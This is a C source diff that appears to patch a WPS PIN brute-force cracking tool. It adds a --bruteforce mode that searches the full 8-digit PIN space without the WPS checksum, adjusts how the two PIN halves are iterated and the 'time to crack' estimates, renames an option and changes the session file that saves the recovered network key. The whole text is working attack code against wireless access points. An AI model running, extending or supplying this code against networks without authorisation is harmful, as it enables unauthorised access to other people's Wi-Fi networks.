@@ -189,9 +189,10 @@ int main(int argc, char *argv[])
 			{"5ghz",	0,	0,	'5'},
 			{"noacks",	0,	0,	'A'},
 			{"nocheck",	0,	0,	'C'},
+			{"bruteforce",	0,	0,	'B'},
 			{"detectlock",	0,	0,	'D'},
 			{"eapfail",	0,	0,	'E'},
-			{"fixed",	0,	0,	'F'},
+			{"force",	0,	0,	'F'},
 			{"lockignore",	0,	0,	'L'},
 			{"m57nack",	0,	0,	'M'},
 			{"nofcs",	0,	0,	'N'},
@@ -204,7 +205,7 @@ int main(int argc, char *argv[])
 			{0,		0,	0,	 0 }
 		};
 
-		int option = getopt_long( argc, argv, "a:b:c:e:i:l:m:p:r:s:t:v:w:1:2:5ACDEFLMNPRSTWh",
+		int option = getopt_long( argc, argv, "a:b:c:e:i:l:m:p:r:s:t:v:w:1:2:5ABCDEFLMNPRSTWh",
 					long_options, &option_index );
 
 		if( option < 0 ) break;
@@ -232,7 +233,7 @@ int main(int argc, char *argv[])
 				G->essid = optarg;
 				break;
 			case 'i' :
-				if (get_int(optarg, &G->pindex) != 0 || 9999999 < G->pindex) {
+				if (get_int(optarg, &G->pindex) != 0 || 99999999 < G->pindex) {
 					snprintf(G->error, 256, "Bad starting index number -- %s\n", optarg);
 					goto usage_err;
 				};
@@ -250,7 +251,7 @@ int main(int argc, char *argv[])
 				};
 				break;
 			case 'p' :
-				if (get_int(optarg, &G->pinstart) != 0 || 9999999 < G->pinstart) {
+				if (get_int(optarg, &G->pinstart) != 0 || 99999999 < G->pinstart) {
 					snprintf(G->error, 256, "Bad starting pin number -- %s\n", optarg);
 					goto usage_err;
 				};
@@ -313,6 +314,9 @@ int main(int argc, char *argv[])
 			case 'A' :
 				G->use_ack = 0;
 				break;
+			case 'B' :
+				G->broken = 1;
+				break;
 			case 'C' :
 				nocheck = 1;
 				break;
@@ -323,7 +327,7 @@ int main(int argc, char *argv[])
 				G->eapfail = 1;
 				break;
 			case 'F' :
-				G->fixed = 1;
+				G->force = 1;
 				break;
 			case 'L' :
 				G->ignore = 1;
@@ -369,6 +373,12 @@ int main(int argc, char *argv[])
 	};
 
 	if (-1 < G->pindex) {
+		if (9999999 < G->pindex && !G->broken) {
+			snprintf(G->error, 256,
+				"Index number must be less than 8 digits unless -bruteforce is specified -- %08d\n",
+				G->pindex);
+			goto usage_err;
+		};
 		if (-1 < G->pinstart) {
 			G->error = "Options --index and --pin are mutually exclusive\n";
 			goto usage_err;
@@ -377,6 +387,12 @@ int main(int argc, char *argv[])
 			G->error = "Option --index is meaningless when specifying --sequential\n";
 			goto usage_err;
 		};
+	};
+	if (9999999 < G->pinstart && !G->broken) {
+		snprintf(G->error, 256,
+			"Pin number must be less than 8 digits unless -bruteforce is specified -- %08d\n",
+			G->pinstart);
+		goto usage_err;
 	};
 
 	G->ifname = argv[optind];
@@ -400,7 +416,7 @@ int main(int argc, char *argv[])
 	fmt_mac(hwmacs, G->hwmac);
 
 	if ((error = init_chans(G)) != NULL) {
-		snprintf(G->error, 256, "Bad channel number -- %s\n", error);
+		snprintf(G->error, 256, "Bad channel number or list -- %s\n", error);
 		goto usage_err;
 	};
 	G->chanx = set_chanx(G, G->chanx);
@@ -655,18 +671,26 @@ int main(int argc, char *argv[])
 
 	char	pinstr[9];
 	int	pincount = 0;
-	int	pinmax = 10000000;
+	int	pinmax = (G->broken ? 100000000 : 10000000);
+	int	pin2max = (G->broken ? 10000 : 1000);
+	int	pin2div = (G->broken ? 1 : 10);
 	int	pin, pindex = get_start(G);
 
 	if (-1 < G->pinstart)
 		pindex = G->pinstart;
-	vprint("[+] Index of starting pin number is '%07d'\n", pindex);
 
 	if (G->random)
-		pin = G->pin1[pindex/1000] * 1000 + G->pin2[pindex%1000];
+		pin = G->pin1[pindex/pin2max] * pin2max + G->pin2[pindex%pin2max] / pin2div;
 	else
 		pin = pindex;
-	snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));
+
+	if (G->broken) {
+		snprintf(pinstr,9,"%08d",pin);
+		vprint("[+] Index of starting pin number is '%08d'\n", pindex);
+	} else {
+		snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));
+		vprint("[+] Index of starting pin number is '%07d'\n", pindex);
+	};
 
 	sigact.sa_handler = sigint_h;
 	sigaction(SIGHUP,  &sigact, 0);
@@ -722,11 +746,13 @@ int main(int argc, char *argv[])
 				d = time*100/pincount;
 				vprint("[!] Run time %02d:%02d:%02d, pins tested %d (%d.%02d seconds per pin)\n",
 								hour, mins, secs, pincount, i, d);
+
 				secs = time = now.tv_sec - last;
 				i = time/32;	time -= i*32;
 				d = time*100/32;
 				time = pinmax - pindex;
-				time = time/1000 + (time%1000 ? time%1000 : 999);
+				time = time/pin2max + (time%pin2max ? time%pin2max : pin2max-1);
+
 				vprint("[!] Current rate %d.%02d seconds per pin, %05d pins remaining\n",
 								i, d, time);
 				secs = ((time * i * 100) + (time * d)) / 200;
@@ -734,12 +760,13 @@ int main(int argc, char *argv[])
 				mins = secs/60;		secs -= mins*60;
 				vprint("[!] Average time to crack is %d hours, %d minutes, %d seconds\n",
 								hour, mins, secs);
+
 				last = now.tv_sec;
 			};
 
 			if (result == KEY1NAK) {
 				if (!key1hit) {
-					pindex += 1000;
+					pindex += pin2max;
 					if (pinmax <= pindex) {
 						vprint("[X] Exhausted first-half possibilities without success\n");
 						return 7;
@@ -751,9 +778,10 @@ int main(int argc, char *argv[])
 				};
 			} else {
 				if (result == KEY2NAK) {
-					key1hit = 1;
-					if (pinmax == 10000000)
-						pinmax = (pindex/1000+1)*1000;
+					if (key1hit ==0) {
+						key1hit = 1;
+						pinmax = (pindex/pin2max+1)*pin2max;
+					};
 					pindex++;
 					if (pinmax <= pindex) {
 						vprint("[X] Exhausted second-half possibilities without success\n");
@@ -767,11 +795,14 @@ int main(int argc, char *argv[])
 			};
 
 			if (G->random)
-				pin = G->pin1[pindex/1000] * 1000 + G->pin2[pindex%1000];
+				pin = G->pin1[pindex/pin2max] * pin2max + G->pin2[pindex%pin2max] / pin2div;
 			else
 				pin = pindex;
 
-			snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));
+			if (G->broken)
+				snprintf(pinstr,9,"%08d",pin);
+			else
+				snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));
 
 		};
 
@@ -793,8 +824,9 @@ int main(int argc, char *argv[])
 	if ((rf = fopen(G->runf, "a")) != NULL) {
 		gettimeofday(&timer, NULL);
 		strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
-		fprintf(rf, "# session ended %s with signal %d\n%07d:%07d:%s:\n",
-				G->error, signm, pindex, pin, G->wdata->cred.key);
+		fprintf(rf, "# session ended %s with signal %d\n%08d:%08d:%01d:%s:\n",
+				G->error, signm, (G->broken ? pindex : pindex*10),
+				(G->broken ? pin : pin*10), G->broken, G->wdata->cred.key);
 		fclose(rf);
 		if (ctrlc && !G->test) fprintf(stderr, "\n");
 		fprintf(stderr, "Saved session to '%s'\n", G->runf);
